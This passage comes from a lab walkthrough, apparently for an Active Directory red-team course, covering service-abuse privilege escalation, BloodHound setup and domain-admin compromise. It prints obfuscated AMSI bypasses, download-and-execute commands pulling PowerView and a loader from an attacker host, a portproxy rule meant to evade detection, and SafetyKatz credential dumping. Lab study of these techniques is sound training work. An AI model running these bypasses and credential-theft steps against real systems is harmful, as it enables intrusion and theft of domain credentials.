</span></pre></table></code></div></div><p>Since we have Bidirectional trust between these 2 forests, we can extract information from the eurocorp.local forest. You need either bi-directional or one-way trust from the eurocorp.local to dollarcorp to be able to use the below command.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">Get-ForestDomain</span><span class="w"> </span><span class="nt">-Forest</span><span class="w"> </span><span class="nx">eurocorp.local</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="p">{</span><span class="n">Get-DomainTrust</span><span class="w"> </span><span class="o">-</span><span class="w">
</span><span class="n">Domain</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><h3 id="learning-objective-5"><span class="mr-2">Learning Objective 5</span><a href="#learning-objective-5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>In this learning objective we will exploit a service on our machine to elevate privileges to local admin. Then Identiy a machine on the domain where we have local admin access. Also we use privileges of a user on jenkins on a host to get admin privileges on the dcorp-ci server.</p><p>We begin by loading powerview after bypassing amsi.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="w"> </span><span class="n">C:\AD\Tools\PowerUp.ps1</span><span class="w">
</span><span class="nx">Invoke-AllChecks</span><span class="w">
</span></pre></table></code></div></div><p>We can use the abuse-function (<code class="language-plaintext highlighter-rouge">Invoke-ServiceAbuse</code>) and add our current domain user to the local Administrators group.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-ServiceAbuse</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'AbyssWebServer'</span><span class="w"> </span><span class="nt">-UserName</span><span class="w"> </span><span class="s1">'dcorp/student520'</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><p>Logging in and out shows we have local administrator privileges.</p><p>For the next task, we will identify a machine in the domain where we have local admin using the Find-PSRemotingLocalAdminAccess.ps1</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools</span><span class="err">&gt;</span><span class="nx">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">
</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\AD\Tools</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="nx">C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\AD\Tools</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Find-PSRemotingLocalAdminAccess</span><span class="w">
</span></pre></table></code></div></div><p>We have admin access on dcorp-adminsrv and on the student machine, we can connect to dcorp-adminsrv using winrs as the student user with</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dcorp-adminsrv</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span></pre></table></code></div></div><p>Or you can do it with PowerShell Remoting</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\AD\Tools</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Enter-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorpadminsrv.dollarcorp.moneycorp.local</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\AD\Tools</span><span class="err">&gt;</span><span class="w"> </span><span class="p">[</span><span class="n">dcorpadminsrv.dollarcorp.moneycorp.local</span><span class="p">]</span><span class="nx">C:\Users\studentx\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
</span><span class="n">dcorp\studentx</span><span class="w">
</span></pre></table></code></div></div><h3 id="learning-objective-6"><span class="mr-2">Learning Objective 6</span><a href="#learning-objective-6" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>This learning objective focuses on setting up <code class="language-plaintext highlighter-rouge">BloodHound</code> to identify the shortest path to Domain Admins in the domain. BLoodhound uses neo4j graph database, so that needs to be set up first.</p><p>Install and start the neo4j service as follows:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\neo4j-community-4.4.5-windows\neo4j-community4.4.5\bin</span><span class="err">&gt;</span><span class="nx">neo4j.bat</span><span class="w"> </span><span class="nx">install-service</span><span class="w">
</span><span class="n">Neo4j</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">installed</span><span class="w">
</span><span class="n">C:\AD\Tools\neo4j-community-4.4.5-windows\neo4j-community4.4.5\bin</span><span class="err">&gt;</span><span class="nx">neo4j.bat</span><span class="w"> </span><span class="nx">start</span><span class="w">
</span></pre></table></code></div></div><p>Once the service is installed browse to localhost:7474 and login with neo4j:neo4j creds, and openblood hound from C:\AD\Tools\bloodHound-win32-x64\BloodHound-win-32-x64 and provide the details</p><p>bolt://localhost:7687 and the user/pass you set in the previous step. Then run the .net AMSI bypass by using this</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="nv">$ZQCUW</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sh">@"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
 [DllImport("kernel32")]
 public static extern IntPtr GetProcAddress(IntPtr hModule, string
procName);
 [DllImport("kernel32")]
 public static extern IntPtr LoadLibrary(string name);
 [DllImport("kernel32")]
 public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr
dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@</span><span class="w">
</span><span class="n">Add-Type</span><span class="w"> </span><span class="nv">$ZQCUW</span><span class="w">
</span><span class="nv">$BBWHVWQ</span><span class="w"> </span><span class="o">=</span><span class="w">
</span><span class="p">[</span><span class="n">ZQCUW</span><span class="p">]::</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s2">"</span><span class="si">$(</span><span class="p">[</span><span class="n">SYstem.Net.wEBUtIlITy</span><span class="p">]::</span><span class="n">HTmldecoDE</span><span class="p">(</span><span class="s1">'&amp;#97;&amp;#109;&amp;#115
;&amp;#105;&amp;#46;&amp;#100;&amp;#108;&amp;#108;'</span><span class="si">)</span><span class="s2">)"</span><span class="p">)</span><span class="w">
</span><span class="nv">$XPYMWR</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">ZQCUW</span><span class="p">]::</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="nv">$BBWHVWQ</span><span class="p">,</span><span class="w">
</span><span class="s2">"</span><span class="si">$(</span><span class="p">[</span><span class="n">systeM.neT.webUtility</span><span class="p">]::</span><span class="n">HtMldECoDE</span><span class="p">(</span><span class="s1">'&amp;#65;&amp;#109;&amp;#115;&amp;#105;&amp;#83;&amp;#99;&amp;#97
;&amp;#110;&amp;#66;&amp;#117;&amp;#102;&amp;#102;&amp;#101;&amp;#114;'</span><span class="si">)</span><span class="s2">)"</span><span class="p">)</span><span class="w">
</span><span class="nv">$p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w">
</span><span class="p">[</span><span class="n">ZQCUW</span><span class="p">]::</span><span class="n">VirtualProtect</span><span class="p">(</span><span class="nv">$XPYMWR</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">uint32</span><span class="p">]</span><span class="mi">5</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="n">x40</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$p</span><span class="p">)</span><span class="w">
</span><span class="nv">$TLML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0xB8"</span><span class="w">
</span><span class="nv">$PURX</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0x57"</span><span class="w">
</span><span class="nv">$YNWL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0x00"</span><span class="w">
</span><span class="nv">$RTGX</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0x07"</span><span class="w">
</span><span class="nv">$XVON</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0x80"</span><span class="w">
</span><span class="nv">$WRUD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0xC3"</span><span class="w">
</span><span class="nv">$KTMJX</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Byte</span><span class="p">[]]</span><span class="w"> </span><span class="p">(</span><span class="nv">$TLML</span><span class="p">,</span><span class="nv">$PURX</span><span class="p">,</span><span class="nv">$YNWL</span><span class="p">,</span><span class="nv">$RTGX</span><span class="p">,</span><span class="o">+</span><span class="nv">$XVON</span><span class="p">,</span><span class="o">+</span><span class="nv">$WRUD</span><span class="p">)</span><span class="w">
</span><span class="p">[</span><span class="n">System.Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">Copy</span><span class="p">(</span><span class="nv">$KTMJX</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$XPYMWR</span><span class="p">,</span><span class="w"> </span><span class="mi">6</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><p>Then run the following commands to run the collector:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools</span><span class="err">&gt;</span><span class="nx">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\AD\Tools</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="nx">C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$ZQCUW</span><span class="w">
</span><span class="p">[</span><span class="n">snip</span><span class="w"> </span><span class="o">.</span><span class="nf">NET</span><span class="w"> </span><span class="n">AMSI</span><span class="w"> </span><span class="n">bypass</span><span class="p">]</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="w">
</span><span class="o">.</span><span class="n">\SharpHound.ps1</span><span class="w">
</span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\AD\Tools\BloodHound-master\BloodHound-master\Collectors</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">InvokeBloodHound</span><span class="w"> </span><span class="nt">-CollectionMethod</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-03-03T07</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mf">16.5006490</span><span class="nt">-08</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">This</span><span class="w"> </span><span class="nx">version</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">SharpHound</span><span class="w"> </span><span class="nx">is</span><span class="w">
</span><span class="n">compatible</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">4.2</span><span class="w"> </span><span class="nx">Release</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">BloodHound</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-03-03T07</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mf">16.8282702</span><span class="nt">-08</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Resolved</span><span class="w"> </span><span class="nx">Collection</span><span class="w"> </span><span class="nx">Methods:</span><span class="w">
</span><span class="n">Group</span><span class="p">,</span><span class="w"> </span><span class="nx">LocalAdmin</span><span class="p">,</span><span class="w"> </span><span class="nx">GPOLocalGroup</span><span class="p">,</span><span class="w"> </span><span class="nx">Session</span><span class="p">,</span><span class="w"> </span><span class="nx">LoggedOn</span><span class="p">,</span><span class="w"> </span><span class="nx">Trusts</span><span class="p">,</span><span class="w"> </span><span class="nx">ACL</span><span class="p">,</span><span class="w"> </span><span class="nx">Container</span><span class="p">,</span><span class="w">
</span><span class="n">RDP</span><span class="p">,</span><span class="w"> </span><span class="nx">ObjectProps</span><span class="p">,</span><span class="w"> </span><span class="nx">DCOM</span><span class="p">,</span><span class="w"> </span><span class="nx">SPNTargets</span><span class="p">,</span><span class="w"> </span><span class="nx">PSRemote</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-03-03T07</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mf">16.8595176</span><span class="nt">-08</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Initializing</span><span class="w"> </span><span class="nx">SharpHound</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">7:01</span><span class="w">
</span><span class="n">AM</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">3/3/2023</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-03-03T07</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mf">22.3601219</span><span class="nt">-08</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Flags:</span><span class="w"> </span><span class="nx">Group</span><span class="p">,</span><span class="w"> </span><span class="nx">LocalAdmin</span><span class="p">,</span><span class="w">
</span><span class="n">GPOLocalGroup</span><span class="p">,</span><span class="w"> </span><span class="nx">Session</span><span class="p">,</span><span class="w"> </span><span class="nx">LoggedOn</span><span class="p">,</span><span class="w"> </span><span class="nx">Trusts</span><span class="p">,</span><span class="w"> </span><span class="nx">ACL</span><span class="p">,</span><span class="w"> </span><span class="nx">Container</span><span class="p">,</span><span class="w"> </span><span class="nx">RDP</span><span class="p">,</span><span class="w"> </span><span class="nx">ObjectProps</span><span class="p">,</span><span class="w">
</span><span class="n">DCOM</span><span class="p">,</span><span class="w"> </span><span class="nx">SPNTargets</span><span class="p">,</span><span class="w"> </span><span class="nx">PSRemote</span><span class="w">
</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="w">
</span><span class="n">SharpHound</span><span class="w"> </span><span class="nx">Enumeration</span><span class="w"> </span><span class="nx">Completed</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">7:02</span><span class="w"> </span><span class="nx">AM</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">3/3/2023</span><span class="o">!</span><span class="w"> </span><span class="nx">Happy</span><span class="w"> </span><span class="nx">Graphing</span><span class="o">!</span><span class="w">
</span></pre></table></code></div></div><p>Once the data is uploaded to bloodhound, search for shortest path to domain admins, ctrl will toggle labels.</p><h3 id="learning-objective-7"><span class="mr-2">Learning Objective 7</span><a href="#learning-objective-7" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Identify a machine in the target domain where a domain admin session is available, and compromise the machine and escalate to prvileges to domain admin.</p><p>From our reverse shell we got on the CI machine through jenkins, we can grab PowerView from our attack machine and look for machines where a domain admin is logged in using Find-DomainUserLocation.</p><p>First you grab the sbloggingbypass.txt from the attackers machine with</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator\.jenkins\workspace\Projectx</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">iex</span><span class="w"> </span><span class="p">(</span><span class="n">iwr</span><span class="w">
</span><span class="nx">http://172.16.100.x/sbloggingbypass.txt</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><p>use the below command to bypass AMSI</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator\.jenkins\workspace\Projectx</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">S</span><span class="se">`e</span><span class="nx">T-It</span><span class="se">`e</span><span class="nx">m</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s1">'V'</span><span class="o">+</span><span class="s1">'aR'</span><span class="w">
</span><span class="o">+</span><span class="w"> </span><span class="s1">'IA'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="s1">'blE:1'</span><span class="o">+</span><span class="s1">'q2'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="s1">'uZ'</span><span class="o">+</span><span class="s1">'x'</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="p">[</span><span class="n">TYpE</span><span class="p">](</span><span class="w"> </span><span class="s2">"{1}{0}"</span><span class="nt">-F</span><span class="s1">'F'</span><span class="p">,</span><span class="s1">'rE'</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w">
</span><span class="p">;</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">Get-varI</span><span class="se">`A`B</span><span class="nx">LE</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="s1">'1Q'</span><span class="o">+</span><span class="s1">'2U'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="s1">'zX'</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="nt">-VaL</span><span class="w">
</span><span class="p">)</span><span class="o">.</span><span class="s2">"A</span><span class="se">`s</span><span class="s2">s</span><span class="se">`E</span><span class="s2">mbly"</span><span class="o">.</span><span class="s2">"GET</span><span class="se">`T</span><span class="s2">Y</span><span class="se">`P</span><span class="s2">e"</span><span class="p">((</span><span class="w"> </span><span class="s2">"{6}{3}{1}{4}{2}{0}{5}"</span><span class="w"> </span><span class="o">-</span><span class="w">
</span><span class="n">f</span><span class="p">(</span><span class="s1">'Uti'</span><span class="o">+</span><span class="s1">'l'</span><span class="p">),</span><span class="s1">'A'</span><span class="p">,(</span><span class="s1">'Am'</span><span class="o">+</span><span class="s1">'si'</span><span class="p">),(</span><span class="s1">'.Man'</span><span class="o">+</span><span class="s1">'age'</span><span class="o">+</span><span class="s1">'men'</span><span class="o">+</span><span class="s1">'t.'</span><span class="p">),(</span><span class="s1">'u'</span><span class="o">+</span><span class="s1">'to'</span><span class="o">+</span><span class="s1">'mation.'</span><span class="p">),</span><span class="s1">'
s'</span><span class="p">,(</span><span class="s1">'Syst'</span><span class="o">+</span><span class="s1">'em'</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="o">.</span><span class="s2">"g</span><span class="se">`e</span><span class="s2">tf</span><span class="se">`i</span><span class="s2">ElD"</span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s2">"{0}{2}{1}"</span><span class="w"> </span><span class="o">-</span><span class="w">
</span><span class="n">f</span><span class="p">(</span><span class="s1">'a'</span><span class="o">+</span><span class="s1">'msi'</span><span class="p">),</span><span class="s1">'d'</span><span class="p">,(</span><span class="s1">'I'</span><span class="o">+</span><span class="s1">'nitF'</span><span class="o">+</span><span class="s1">'aile'</span><span class="p">)</span><span class="w"> </span><span class="p">),(</span><span class="w"> </span><span class="s2">"{2}{4}{0}{1}{3}"</span><span class="w"> </span><span class="nt">-f</span><span class="w">
</span><span class="p">(</span><span class="s1">'S'</span><span class="o">+</span><span class="s1">'tat'</span><span class="p">),</span><span class="s1">'i'</span><span class="p">,(</span><span class="s1">'Non'</span><span class="o">+</span><span class="s1">'Publ'</span><span class="o">+</span><span class="s1">'i'</span><span class="p">),</span><span class="s1">'c'</span><span class="p">,</span><span class="s1">'c,'</span><span class="w"> </span><span class="p">))</span><span class="o">.</span><span class="s2">"sE</span><span class="se">`T`V</span><span class="s2">aLUE"</span><span class="p">(</span><span class="w">
</span><span class="nv">${n`ULl}</span><span class="p">,</span><span class="nv">${t`RuE}</span><span class="w"> </span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><p>Then download and executre PowerView in memory on the victim machine with</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">iex</span><span class="w"> </span><span class="p">((</span><span class="n">New-Object</span><span class="w">
</span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://172.16.100.X/PowerView.ps1'</span><span class="p">))</span><span class="w">
</span></pre></table></code></div></div><p>Make sure to host the file using HFS.exe or your prefered choice of hosting software. Then run</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Find-DomainUserLocation</span><span class="w">
</span></pre></table></code></div></div><p>This command can take a while, but you can see if there is a domain admin session available. You can abuse it by using winrs or powershell remoting. To use winrs, use</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dcorp-mgmt</span><span class="w"> </span><span class="nx">hostname</span><span class="p">;</span><span class="n">whoami</span><span class="w">
</span></pre></table></code></div></div><p>Then we can run safetykatz.exe on the dcorp-mgmt to extract credentials. To do that, we need to copy loader.exe on dcorp-mgmt from the dcorp-ci machine we have to avoid any downloading activity on dcorp-mgmt.</p><p>Run the following command on the reverse shell</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">iwr</span><span class="w"> </span><span class="nx">http://172.16.100.20/Loader.exe</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nx">C:\Users\Public\Loader.exe</span><span class="w">
</span></pre></table></code></div></div><p>Then copy it to the victim machine as such</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\Users\Public\Loader.exe</span><span class="w"> </span><span class="nx">\\dcorp-mgmt\C</span><span class="err">$</span><span class="nx">\Users\Public\Loader.exe</span><span class="w">
</span></pre></table></code></div></div><p>Using winrs add the following port forward rule on dcorp-mgmt to avoid detected</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="bp">$null</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dcorp-mgmt</span><span class="w"> </span><span class="s2">"netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.20"</span><span class="w">
</span></pre></table></code></div></div><p>Note that the $null variable is used to address output redirection issues. Use loader.exe to download and execute SafetyKatz.exe in memory on the dcorp-mgmt machine with this command on the reverse shell</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="bp">$null</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dcorp-mgmt</span><span class="w"> </span><span class="nx">C:\Users\Public\Loader.exe</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">http://127.0.0.1:8080/SafetyKatz.exe</span><span class="w"> </span><span class="nx">sekurlsa::ekeys</span><span class="w"> </span><span class="nx">exit</span><span class="w">
</span></pre></table></code></div></div><p>To do it with powershell remoting, first check we can run commands on the dcorp-mgmt machine with</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="n">whoami</span><span class="p">;</span><span class="n">hostname</span><span class="p">}</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="n">dcorp-mgmt</span><span class="w">
